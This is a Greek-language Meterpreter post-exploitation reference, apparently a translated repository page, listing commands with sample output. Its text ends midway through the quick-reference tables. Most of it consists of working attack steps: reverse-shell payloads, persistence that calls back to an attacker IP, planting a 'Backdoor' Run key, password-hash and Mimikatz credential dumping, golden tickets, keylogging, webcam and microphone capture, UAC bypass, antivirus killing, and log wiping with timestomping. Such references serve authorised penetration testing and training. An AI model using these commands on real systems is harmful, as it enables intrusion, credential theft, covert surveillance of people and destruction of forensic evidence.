# 🎭 Meterpreter — Πλήρης οδηγός αναφοράς

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../Meterpreter.md) • [🇹🇷 Türkçe](Meterpreter.tr.md)

```
    ███╗   ███╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝██████╔╝██████╔╝█████╗     ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██╔══╝     ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║██║     ██║  ██║███████╗   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

![Meterpreter](https://img.shields.io/badge/Meterpreter-Session-purple?style=for-the-badge)
![Ενέργειες μετά την πρόσβαση](https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-Linux-green?style=for-the-badge)

> **Meterpreter:** Περιβάλλον συνεδρίας για εξουσιοδοτημένους ελέγχους μετά την απόκτηση πρόσβασης.

---

## Πριν ξεκινήσετε

Το **Meterpreter** είναι περιβάλλον συνεδρίας με εντολές και επεκτάσεις. Οι λειτουργίες εξαρτώνται από την πλατφόρμα, την υλοποίηση payload, την έκδοση και τα πραγματικά δικαιώματα. Τα **channels** είναι κανάλια εισόδου/εξόδου, τα **extensions** επεκτάσεις λειτουργιών και το **transport** ο τρόπος επικοινωνίας της συνεδρίας.

Το **migration** είναι απόπειρα μεταφοράς σε άλλη διεργασία, το **pivoting** χρήση υπάρχουσας πρόσβασης για επικοινωνία με άλλο τμήμα δικτύου και το **port forwarding** προώθηση μιας θύρας σε άλλη υπηρεσία. Το **token** αντιπροσωπεύει πλαίσιο ταυτότητας και προνομίων· η χρήση άλλου token έχει συγκεκριμένες προϋποθέσεις.

Τα παραδείγματα περιλαμβάνουν εντολές και ενδεικτικές εξόδους μαζί. Γραμμές όπως Computer, Server username, αποθηκευμένα paths, hashes και μηνύματα επιτυχίας είναι δείγματα του πρωτοτύπου, όχι αποτελέσματα από τον υπολογιστή σας. Το πρόθεμα meterpreter > δεν αποτελεί τμήμα της ίδιας της εντολής. Τα ονόματα αρχείων, οι IP, οι λογαριασμοί και οι συνεδρίες είναι ενδεικτικά.

Ξεχωρίστε την ανάγνωση πληροφοριών από τις ενέργειες που μεταφέρουν αρχεία, τερματίζουν διεργασίες, αλλάζουν μητρώο ή καταγραφές και συλλέγουν δεδομένα οθόνης, πληκτρολογίου, κάμερας ή μικροφώνου. Καμία παρουσίαση του πρωτοτύπου ως «stealth» ή «safe» δεν αποτελεί εγγύηση σταθερότητας ή απουσίας ιχνών.

## 📋 Περιεχόμενα

- [Τι είναι το Meterpreter;](#section-01)
- [Κεντρικές εντολές](#section-02)
- [Πληροφορίες συστήματος](#section-03)
- [Εντολές συστήματος αρχείων](#section-04)
- [Εντολές δικτύου](#section-05)
- [Εντολές διεργασιών](#section-06)
- [Χρήστες και δικαιώματα](#section-07)
- [Συλλογή στοιχείων ταυτοποίησης](#section-08)
- [Καταγραφή πληκτρολογήσεων](#section-09)
- [Στιγμιότυπα οθόνης και κάμερας](#section-10)
- [Διατήρηση πρόσβασης (Persistence)](#section-11)
- [Pivoting και προώθηση θυρών](#section-12)
- [Ενέργειες που μεταβάλλουν ψηφιακά ίχνη](#section-13)
- [Scripts και αυτοματοποίηση](#section-14)
- [Πίνακας γρήγορης αναφοράς](#section-15)
- [Συμβουλές χρήσης](#section-16)
- [Πλαίσιο εξουσιοδοτημένης χρήσης](#section-17)
- [Σχετικές πηγές](#section-18)

---

<a id="section-01"></a>

## 🎯 Τι είναι το Meterpreter;

Το **Meterpreter** (Meta-Interpreter) είναι επεκτάσιμο περιβάλλον payload και συνεδρίας. Ο τρόπος φόρτωσης και επικοινωνίας εξαρτάται από την υλοποίηση, την πλατφόρμα και τη μεταφορά· η περιγραφή DLL και stager του πρωτοτύπου δεν καλύπτει κάθε τύπο.

### Βασικά χαρακτηριστικά

| Χαρακτηριστικό | Περιγραφή |
| --------- | ------------- |
| **Εκτέλεση στη μνήμη** | Εκτέλεση στη μνήμη — δεν συνεπάγεται απουσία ψηφιακών ιχνών |
| **Κρυπτογραφημένη επικοινωνία** | Κανάλι TLS όπου υποστηρίζεται από τη συγκεκριμένη υλοποίηση και μεταφορά |
| **Επεκτάσιμο** | Φόρτωση επεκτάσεων κατά τη συνεδρία |
| **Πολλαπλές πλατφόρμες** | Windows, Linux, macOS, Android, PHP, Java |
| **Δυνατότητες pivoting** | Δρομολόγηση μέσω συστημάτων με διαθέσιμη πρόσβαση |

### Παραδείγματα τύπων Meterpreter

```bash
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# macOS
osx/x64/meterpreter/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# Python
python/meterpreter/reverse_tcp
```

---

<a id="section-02"></a>

## ⌨️ Κεντρικές εντολές

### Βοήθεια και πλοήγηση

```bash
# Προβολή διαθέσιμων εντολών
meterpreter > help

# Βοήθεια για συγκεκριμένη εντολή
meterpreter > help upload

# Προβολή πληροφοριών καναλιού
meterpreter > channel -l
```

### Διαχείριση συνεδριών

Η background επιστρέφει στο πλαίσιο χωρίς να ισοδυναμεί με τερματισμό. Μην θεωρήσετε ότι exit και quit έχουν διαφορετική ασφαλή συμπεριφορά μόνο από τα σχόλια του πρωτοτύπου· ελέγξτε τη βοήθεια της συνεδρίας. Η transport add προσθέτει ρύθμιση μεταφοράς και δεν εγγυάται αυτόματη ανάκτηση μιας χαμένης συνεδρίας.


```bash
# Πληροφορίες συνεδρίας
meterpreter > info

# Μεταφορά τρέχουσας συνεδρίας στο παρασκήνιο
meterpreter > background
meterpreter > bg

# Επιστροφή στο msfconsole σύμφωνα με τη λειτουργία της εντολής
meterpreter > exit

# Τερματισμός συνεδρίας
meterpreter > quit

# Παράδειγμα διαχείρισης μεταφοράς επικοινωνίας
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l <LHOST> -p <LPORT>
```

### Διαχείριση καναλιών

```bash
# Προβολή: ενεργά κανάλια
meterpreter > channel -l

# Αλληλεπίδραση με κανάλι
meterpreter > channel -i <id>

# Ανάγνωση από κανάλι
meterpreter > channel -r <id>

# Εγγραφή σε κανάλι
meterpreter > channel -w <id>

# Κλείσιμο καναλιού
meterpreter > channel -c <id>
```

---

<a id="section-03"></a>

## 💻 Πληροφορίες συστήματος

### Βασικές πληροφορίες συστήματος

```bash
# Ανάκτηση: πληροφορίες συστήματος
meterpreter > sysinfo
Computer        : WIN-PC
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

# Ανάκτηση: τρέχων χρήστης
meterpreter > getuid
Server username: WIN-PC\Administrator

# Ανάκτηση: αναγνωριστικό τρέχουσας διεργασίας
meterpreter > getpid
Current pid: 1234

# Ανάκτηση: όνομα διεργασίας
meterpreter > getpname

# Έλεγχος ενδείξεων εικονικής μηχανής
meterpreter > run post/windows/gather/checkvm
```

### Περιβάλλον και μητρώο Windows

```bash
# Προβολή: μεταβλητές περιβάλλοντος
meterpreter > getenv PATH
meterpreter > getenv USERNAME

# Ορισμός μεταβλητής περιβάλλοντος
meterpreter > setenv VAR value

# Εργασίες στο μητρώο Windows
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityHealth
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\backdoor.exe"
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

### Εγκατεστημένο λογισμικό και ενημερώσεις

```bash
# Προβολή: εγκατεστημένες εφαρμογές
meterpreter > run post/windows/gather/enum_applications

# Προβολή: εγκατεστημένες ενημερώσεις
meterpreter > run post/windows/gather/enum_patches

# Έλεγχος διαδρομών υπηρεσιών χωρίς κατάλληλα εισαγωγικά
meterpreter > run post/windows/gather/enum_unquoted_service_paths
```

---

<a id="section-04"></a>

## 📁 Εντολές συστήματος αρχείων

### Πλοήγηση

```bash
# Εμφάνιση τρέχοντος καταλόγου
meterpreter > pwd
C:\Users\Administrator\Desktop

# Προβολή: περιεχόμενα καταλόγου
meterpreter > ls
meterpreter > ls -la

# Αλλαγή καταλόγου
meterpreter > cd C:\\Users
meterpreter > cd ..

# Προβολή τρέχοντος τοπικού καταλόγου
meterpreter > lpwd

# Αλλαγή τοπικού καταλόγου
meterpreter > lcd /tmp

# Προβολή: τοπικός κατάλογος
meterpreter > lls
```

### Εργασίες σε αρχεία

```bash
# Ανάγνωση περιεχομένου αρχείου
meterpreter > cat C:\\Users\\Administrator\\Desktop\\secret.txt

# Επεξεργασία αρχείου
meterpreter > edit C:\\file.txt

# Διαγραφή αρχείου
meterpreter > rm C:\\temp\\malware.exe

# Δημιουργία καταλόγου
meterpreter > mkdir C:\\temp\\hidden

# Αφαίρεση καταλόγου
meterpreter > rmdir C:\\temp\\hidden

# Αντιγραφή αρχείου
meterpreter > cp source.txt destination.txt

# Μετακίνηση ή μετονομασία αρχείου
meterpreter > mv oldname.txt newname.txt
```

### Μεταφορά αρχείων

```bash
# Λήψη αρχείου από το εργαστηριακό σύστημα
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/

# Αναδρομική λήψη
meterpreter > download -r C:\\Users\\Administrator\\Documents

# Αποστολή αρχείου στο εργαστηριακό σύστημα
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\
meterpreter > upload -r /local/directory C:\\remote\\directory

# Παράδειγμα επιλογής μεταφοράς του πρωτοτύπου — ελέγξτε τη βοήθεια της έκδοσης
meterpreter > download -p C:\\large_file.zip
```

### Αναζήτηση αρχείων

```bash
# Αναζήτηση αρχείων
meterpreter > search -f *.txt
meterpreter > search -f password* -d C:\\Users
meterpreter > search -f *.docx -d C:\\

# Αναζήτηση συγκεκριμένου μοτίβου αρχείων
meterpreter > search -f *.kdbx

# Αναζήτηση με μοτίβο ονόματος αρχείου
meterpreter > search -f *password* -r
```

### Hashes αρχείων και χρονικές σημάνσεις

```bash
# Ανάκτηση: hash αρχείου
meterpreter > checksum md5 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha1 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha256 C:\\file.exe

# Μεταβολή χρονικών σημάνσεων αρχείου
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe
meterpreter > timestomp C:\\backdoor.exe -z "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"
```

---

<a id="section-05"></a>

## 🌐 Εντολές δικτύου

### Πληροφορίες δικτύου

```bash
# Ανάκτηση: δικτυακές διεπαφές
meterpreter > ipconfig
meterpreter > ifconfig

# Ανάκτηση: πίνακας δρομολόγησης
meterpreter > route

# Ανάκτηση: προσωρινός πίνακας ARP
meterpreter > arp

# Ανάκτηση: ενεργές δικτυακές συνδέσεις
meterpreter > netstat
```

### Προώθηση θυρών

```bash
# Προώθηση τοπικής θύρας σε απομακρυσμένη υπηρεσία
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# Προβολή: προωθήσεις θυρών
meterpreter > portfwd list

# Αφαίρεση προώθησης θύρας
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.100

# Αφαίρεση όλων των προωθήσεων θυρών
meterpreter > portfwd flush

# Παράδειγμα προώθησης RDP
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
# Σύνδεση στο παράδειγμα: rdesktop 127.0.0.1:3389
```

### DNS και βοηθητικές λειτουργίες δικτύου

```bash
# Επίλυση ονόματος συστήματος
meterpreter > resolve google.com

# Ανάκτηση: ρυθμίσεις proxy
meterpreter > run post/windows/gather/enum_proxy
```

---

<a id="section-06"></a>

## ⚙️ Εντολές διεργασιών

### Κατάλογος διεργασιών

```bash
# Προβολή: όλες οι διεργασίες
meterpreter > ps

# Φιλτράρισμα διεργασιών
meterpreter > pgrep explorer.exe
meterpreter > pgrep -u Administrator

# Ανάκτηση: πληροφορίες τρέχουσας διεργασίας
meterpreter > getpid
```

### Ενέργειες σε διεργασίες

```bash
# Απόπειρα μεταφοράς σε άλλη διεργασία
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe

# Τερματισμός διεργασίας
meterpreter > kill <PID>

# Εκτέλεση εντολής και λήψη αποτελέσματος
meterpreter > execute -f cmd.exe -a "/c whoami" -i -H

# Εκτέλεση στο παρασκήνιο
meterpreter > execute -f notepad.exe -H

# Εκτέλεση με κανάλι εισόδου και εξόδου
meterpreter > execute -f cmd.exe -c -i
```

### Σημειώσεις μεταφοράς σε άλλη διεργασία

Δεν υπάρχει καθολικά ασφαλής διεργασία migration. Η επιτυχία εξαρτάται από αρχιτεκτονική, δικαιώματα και προστασίες. Η αναφορά του πρωτοτύπου ότι απαιτείται μεταφορά σε lsass.exe για hashdump είναι υπεραπλούστευση και δεν πρέπει να θεωρείται γενικός κανόνας.


```bash
# Παραδείγματα διεργασιών του πρωτοτύπου — καμία δεν είναι καθολικά ασφαλής επιλογή μεταφοράς
# - explorer.exe: διεργασία χρήστη, με προϋποθέσεις συμβατότητας
# - svchost.exe: πολλαπλές εμφανίσεις με διαφορετικά πλαίσια και δικαιώματα
# - lsass.exe: ευαίσθητη διεργασία· η πρόσβαση δεν είναι γενική προϋπόθεση κάθε hashdump

# Εντοπισμός της διεργασίας explorer.exe και παράδειγμα μεταφοράς
meterpreter > ps | grep explorer
meterpreter > migrate <explorer_pid>

# Παράδειγμα αυτόματης επιλογής διεργασίας
meterpreter > run post/windows/manage/migrate
```

---

<a id="section-07"></a>

## 👤 Χρήστες και δικαιώματα

### Πληροφορίες τρέχοντος χρήστη

Η getsystem που περιλαμβάνεται εδώ επιχειρεί αλλαγή προνομίων· δεν είναι απλή εντολή ανάγνωσης της κατάστασης elevation.


```bash
# Ανάκτηση: τρέχων χρήστης
meterpreter > getuid
Server username: WIN-PC\Administrator

# Ανάκτηση: τρέχοντα προνόμια
meterpreter > getprivs

# Το πρωτότυπο χρησιμοποιεί getsystem εδώ — είναι απόπειρα αλλαγής δικαιωμάτων, όχι απλός έλεγχος
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation)
```

### Ανύψωση δικαιωμάτων

```bash
# Απόπειρα απόκτησης δικαιωμάτων SYSTEM
meterpreter > getsystem
meterpreter > getsystem -t 1  # Χρήση ταυτότητας μέσω named pipe, στη μνήμη, με προϋποθέσεις διαχειριστή
meterpreter > getsystem -t 2  # Χρήση ταυτότητας μέσω named pipe, με δημιουργία αρχείου και προϋποθέσεις διαχειριστή
meterpreter > getsystem -t 3  # Αντιγραφή token στη μνήμη, με προϋποθέσεις διαχειριστή

# Παράδειγμα UAC από το msfconsole
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION 1
msf6 > exploit

# Αναζήτηση πιθανών τοπικών αδυναμιών
meterpreter > run post/multi/recon/local_exploit_suggester

# Χρήση token άλλης διεργασίας όπου επιτρέπεται
meterpreter > steal_token <PID>

# Εγκατάλειψη του token που χρησιμοποιήθηκε
meterpreter > drop_token

# Ενέργειες με άλλη διαθέσιμη ταυτότητα
meterpreter > impersonate_token "DOMAIN\\Administrator"

# Κατάλογος διαθέσιμων tokens
meterpreter > use incognito
meterpreter > list_tokens -u
```

### Συλλογή πληροφοριών χρηστών

```bash
# Προβολή: τοπικοί χρήστες
meterpreter > run post/windows/gather/enum_logged_on_users

# Προβολή: χρήστες domain όπου το σύστημα είναι μέλος
meterpreter > run post/windows/gather/enum_domain_users

# Προβολή: τοπικές ομάδες
meterpreter > run post/windows/gather/local_admin_search_enum
```

---

<a id="section-08"></a>

## 🔐 Συλλογή στοιχείων ταυτοποίησης

### Εξαγωγή hashes

```bash
# Εξαγωγή hashes με τις απαιτούμενες προσβάσεις
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# Εναλλακτικό παράδειγμα του πρωτοτύπου σε περίπτωση αποτυχίας hashdump
meterpreter > run post/windows/gather/smart_hashdump
```

### Mimikatz και επέκταση Kiwi

```bash
# Φόρτωση επέκτασης Kiwi του Mimikatz
meterpreter > load kiwi

# Ανάκτηση διαθέσιμων στοιχείων σύνδεσης
meterpreter > creds_all

# Αναζήτηση διαθέσιμων στοιχείων σύνδεσης στη μνήμη
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# Εξαγωγή tickets Kerberos
meterpreter > kiwi_cmd sekurlsa::tickets

# Ανάκτηση διαθέσιμων στοιχείων αποθηκευμένων δικτύων WiFi
meterpreter > kiwi_cmd misc::wifi

# Εξαγωγή διαθέσιμων στοιχείων LSA
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Παράδειγμα Golden Ticket
meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <domain_sid> -u Administrator -t /tmp/golden.kirbi
```

### Συλλογή στοιχείων σύνδεσης

```bash
# Αναζήτηση πιθανών στοιχείων σύνδεσης σε αρχεία
meterpreter > run post/multi/gather/credentials/generic

# Διαθέσιμα στοιχεία σύνδεσης εφαρμογών περιήγησης
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome

# Κλειδιά SSH
meterpreter > run post/multi/gather/ssh_creds

# Διαχείριση στοιχείων σύνδεσης Windows
meterpreter > run post/windows/gather/enum_cred_store

# Διαθέσιμα στοιχεία σύνδεσης Outlook
meterpreter > run post/windows/gather/credentials/outlook
```

---

<a id="section-09"></a>

## ⌨️ Καταγραφή πληκτρολογήσεων

### Έναρξη και διακοπή καταγραφής πληκτρολογήσεων

```bash
# Έναρξη καταγραφής πληκτρολογήσεων
meterpreter > keyscan_start
Starting the keystroke sniffer...

# Προβολή καταγεγραμμένων πληκτρολογήσεων
meterpreter > keyscan_dump
Dumping captured keystrokes...
username: admin
password: secretpass123

# Διακοπή καταγραφής πληκτρολογήσεων
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

### Πρόσθετα παραδείγματα καταγραφής πληκτρολογήσεων

```bash
# Παράδειγμα καταγραφής πληκτρολογήσεων με module
meterpreter > run post/windows/capture/keylog_recorder

# Παράδειγμα μεταφοράς σε explorer.exe για το σχετικό πλαίσιο χρήστη
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start
```

---

<a id="section-10"></a>

## 📸 Στιγμιότυπα οθόνης και κάμερας

### Στιγμιότυπα οθόνης

```bash
# Λήψη στιγμιότυπου οθόνης
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg

# Λήψη στιγμιότυπου με συγκεκριμένη διαδρομή
meterpreter > screenshot -p /tmp/screen.jpg

# Παράδειγμα επαναλαμβανόμενων στιγμιότυπων
meterpreter > run post/multi/gather/screen_spy

# Παράδειγμα προβολής επιφάνειας εργασίας
meterpreter > screenshare
```

### Ενέργειες κάμερας

```bash
# Προβολή: διαθέσιμες κάμερες
meterpreter > webcam_list
1: Integrated Webcam

# Λήψη στιγμιότυπου κάμερας
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/webcam.jpeg

# Λήψη στιγμιότυπου με επιλογές
meterpreter > webcam_snap -i 1 -p /tmp/webcam.jpg

# Παράδειγμα ροής εικόνας κάμερας
meterpreter > webcam_stream
```

### Καταγραφή ήχου

```bash
# Καταγραφή μικροφώνου
meterpreter > record_mic -d 30
[*] Starting...
[*] Stopped
Audio saved to: /root/audio.wav

# Καταγραφή με συγκεκριμένη διάρκεια
meterpreter > record_mic -d 60 -f /tmp/recording.wav
```

---

<a id="section-11"></a>

## 🔄 Διατήρηση πρόσβασης (Persistence)

Αρκετά ονόματα scripts του πρωτοτύπου αφορούν παλαιότερες εκδόσεις. Οι επιλογές και η υποστήριξη πρέπει να ελεγχθούν στη δική σας εγκατάσταση. Η διαγραφή μιας συγκεκριμένης τιμής Run δεν αποδεικνύει αφαίρεση κάθε μηχανισμού persistence.


### Παραδείγματα διατήρησης πρόσβασης στα Windows

```bash
# Παράδειγμα διατήρησης πρόσβασης με αλλαγές μητρώου
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Περιγραφή διατήρησης πρόσβασης του πρωτοτύπου — ελέγξτε το module
meterpreter > run post/windows/manage/persistence_exe

# Διατήρηση πρόσβασης μέσω υπηρεσίας στο παράδειγμα
meterpreter > run metsvc

# Διατήρηση πρόσβασης μέσω WMI στο παράδειγμα
meterpreter > run post/windows/manage/wmi_persistence
```

### Επεξήγηση επιλογών του παραδείγματος persistence

```bash
# Επιλογές παλαιότερου script persistence του πρωτοτύπου
-A        # Αυτόματη εκκίνηση αντίστοιχου handler
-L <path> # Θέση εγγραφής payload
-P <path> # Payload προς χρήση
-S        # Εκκίνηση ως υπηρεσία με τις απαιτούμενες προσβάσεις
-T        # Εναλλακτικό πρότυπο EXE
-U        # Εκκίνηση κατά τη σύνδεση χρήστη
-X        # Εκκίνηση κατά την εκκίνηση συστήματος
-i <sec>  # Διάστημα ανάμεσα σε προσπάθειες σύνδεσης
-p <port> # Θύρα προς την οποία συνδέεται το payload
-r <ip>   # IP προς την οποία συνδέεται το payload
```

### Εξέταση και αφαίρεση μηχανισμών διατήρησης πρόσβασης

```bash
# Προβολή: ενδείξεις μηχανισμών διατήρησης πρόσβασης
meterpreter > run post/windows/gather/enum_persistence

# Χειροκίνητο παράδειγμα αφαίρεσης συγκεκριμένης εγγραφής
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

---

<a id="section-12"></a>

## 🔀 Pivoting και προώθηση θυρών

### Διαχείριση διαδρομών

```bash
# Προσθήκη διαδρομής μέσω συνεδρίας
meterpreter > run autoroute -s 10.10.10.0/24

# Προβολή διαδρομών
meterpreter > run autoroute -p

# Αφαίρεση διαδρομής
meterpreter > run autoroute -d -s 10.10.10.0/24

# Μέσα από το msfconsole
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route print
```

### Ενδιάμεσος διακομιστής SOCKS

```bash
# Εκκίνηση SOCKS proxy μέσα από το msfconsole
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j

# Ρύθμιση proxychains
# Επεξεργασία του αρχείου /etc/proxychains.conf:
# socks4 127.0.0.1 1080

# Χρήση μέσω proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains ssh user@10.10.10.5
```

### Παραδείγματα προώθησης θυρών

```bash
# Προώθηση τοπικής θύρας προς εσωτερικό σύστημα
meterpreter > portfwd add -l 445 -p 445 -r 10.10.10.5

# Παράδειγμα αντίστροφης προώθησης θύρας
meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.50

# Ενδεικτικά σενάρια:
# Πρόσβαση σε εσωτερικό διακομιστή ιστού
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.100

# Πρόσβαση σε εσωτερική υπηρεσία RDP
meterpreter > portfwd add -l 33389 -p 3389 -r 10.10.10.5

# Πρόσβαση σε εσωτερική υπηρεσία SMB
meterpreter > portfwd add -l 1445 -p 445 -r 10.10.10.5
```

---

<a id="section-13"></a>

## 🧹 Ενέργειες που μεταβάλλουν ψηφιακά ίχνη

Οι εντολές αλλάζουν καταγραφές ή χρονικές σημάνσεις και μπορεί να καταστρέψουν στοιχεία ελέγχου. Δεν αποδεικνύουν απουσία ιχνών ούτε αποτελούν γενικό βήμα ολοκλήρωσης ελέγχου.


### Ενέργειες διαγραφής ή μεταβολής ιχνών

```bash
# Διαγραφή καταχωρίσεων συμβάντων Windows
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 5678 records from System...
[*] Wiping 9012 records from Security...

# Μεταβολή χρονικών σημάνσεων αρχείων
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

### Παραδείγματα αποφυγής εντοπισμού του πρωτοτύπου

```bash
# Παράδειγμα μεταφοράς σε υπάρχουσα διεργασία
meterpreter > migrate -N svchost.exe

# Έλεγχος ενδείξεων εγκατεστημένων προϊόντων προστασίας
meterpreter > run post/windows/gather/enum_av

# Παράδειγμα παρεμβολής σε λογισμικό προστασίας του πρωτοτύπου
meterpreter > run post/windows/manage/killav

# Περιγραφή του πρωτοτύπου για εισαγωγή σε διεργασία
meterpreter > run post/windows/manage/inject_host
```

---

<a id="section-14"></a>

## 📜 Scripts και αυτοματοποίηση

### Αρχεία εντολών (Resource Scripts)

```bash
# Δημιουργία αρχείου εντολών
echo "sysinfo
getuid
hashdump
run post/windows/gather/enum_logged_on_users" > post_exploit.rc

# Εκτέλεση αρχείου εντολών
meterpreter > resource post_exploit.rc
```

### Ενδεικτικά scripts

```bash
# Συλλογή πληροφοριών συστήματος
meterpreter > run scraper

# Παράδειγμα ευρείας συλλογής πληροφοριών
meterpreter > run winenum

# Έλεγχος ενδείξεων εικονικής μηχανής
meterpreter > run checkvm

# Προβολή τοπικών υποδικτύων για το πεδίο του ελέγχου
meterpreter > run get_local_subnets

# Παράδειγμα αναζήτησης σχετικών τοπικών αδυναμιών
meterpreter > run post/multi/recon/local_exploit_suggester
```

### Διαδραστικό περιβάλλον Ruby (IRB)

```bash
# Είσοδος στο διαδραστικό περιβάλλον Ruby
meterpreter > irb

# Παράδειγμα καταλόγου αρχείων
>> client.fs.dir.entries("C:\\")

# Παράδειγμα ανάγνωσης αρχείου
>> client.fs.file.open("C:\\secret.txt").read

# Έξοδος από IRB
>> exit
```

---

<a id="section-15"></a>

## 📊 Πίνακας γρήγορης αναφοράς

### Βασικές εντολές

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `sysinfo` | Πληροφορίες συστήματος |
| `getuid` | Τρέχων χρήστης |
| `getpid` | Αναγνωριστικό τρέχουσας διεργασίας |
| `ps` | Κατάλογος διεργασιών |
| `migrate <PID>` | Απόπειρα μεταφοράς σε άλλη διεργασία |
| `getsystem` | Απόπειρα απόκτησης δικαιωμάτων SYSTEM |
| `hashdump` | Εξαγωγή διαθέσιμων hashes κωδικών |
| `shell` | Μετάβαση σε κονσόλα του λειτουργικού |
| `upload <src> <dst>` | Αποστολή αρχείου |
| `download <src>` | Λήψη αρχείου |
| `screenshot` | Καταγραφή στιγμιότυπου οθόνης |
| `webcam_snap` | Στιγμιότυπο κάμερας |
| `keyscan_start` | Έναρξη καταγραφής πληκτρολογήσεων |
| `keyscan_dump` | Ανάγνωση καταγεγραμμένων πληκτρολογήσεων |

### Εργασίες σε αρχεία

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `pwd` | Εμφάνιση τρέχοντος καταλόγου |
| `cd <dir>` | Αλλαγή καταλόγου |
| `ls` | Κατάλογος αρχείων |
| `cat <file>` | Ανάγνωση αρχείου |
| `edit <file>` | Επεξεργασία αρχείου |
| `rm <file>` | Διαγραφή αρχείου |
| `mkdir <dir>` | Δημιουργία καταλόγου |
| `search -f <pattern>` | Αναζήτηση αρχείων |

### Ενέργειες δικτύου

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `ipconfig` | Δικτυακές διεπαφές |
| `route` | Πίνακας δρομολόγησης |
| `netstat` | Ενεργές συνδέσεις |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Προώθηση θύρας |
| `run autoroute -s <subnet>` | Προσθήκη διαδρομής για pivoting |

### Ανύψωση δικαιωμάτων

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `getsystem` | Απόπειρα απόκτησης δικαιωμάτων SYSTEM |
| `getprivs` | Κατάλογος τρεχόντων δικαιωμάτων |
| `steal_token <PID>` | Χρήση token από άλλη διεργασία όπου επιτρέπεται |
| `load incognito` | Φόρτωση επέκτασης incognito |
| `list_tokens -u` | Κατάλογος διαθέσιμων tokens |
| `impersonate_token` | Ενέργειες με token άλλου χρήστη όπου επιτρέπεται |

### Συλλογή στοιχείων ταυτοποίησης

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `hashdump` | Εξαγωγή διαθέσιμων hashes SAM |
| `load kiwi` | Φόρτωση λειτουργιών Mimikatz |
| `creds_all` | Διαθέσιμα στοιχεία σύνδεσης |
